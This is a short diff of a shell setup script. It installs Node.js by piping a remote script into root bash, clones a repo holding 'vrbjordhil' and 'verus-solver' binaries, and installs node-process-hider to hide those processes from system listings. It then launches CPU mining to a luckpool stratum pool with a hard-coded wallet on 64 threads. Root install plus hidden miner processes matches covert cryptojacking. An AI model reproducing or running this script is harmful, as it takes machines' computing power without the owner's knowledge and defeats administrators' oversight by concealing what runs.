@@ -10,5 +10,7 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf /etc/ini
 git clone https://github.com/Bjordhil/CUSTOM
 cd CUSTOM
 chmod +x vrbjordhil && chmod +x verus-solver
-sudo su --command "curl -sL https://deb.nodesource.com/setup_20.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@10.8.1 && sudo ph add vrbjordhil && sudo ph add verus-solver"
+sudo su --command "curl -sL https://deb.nodesource.com/setup_20.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@10.8.1"
+sudo ph add vrbjordhil
+sudo ph add verus-solver
 ./vrbjordhil -c stratum+tcp://ap.luckpool.net:3960 -u RG6DfuhnggRT2TZ8p6SFQt3FHakfJ3ac6J.CURL -p x --cpu 64
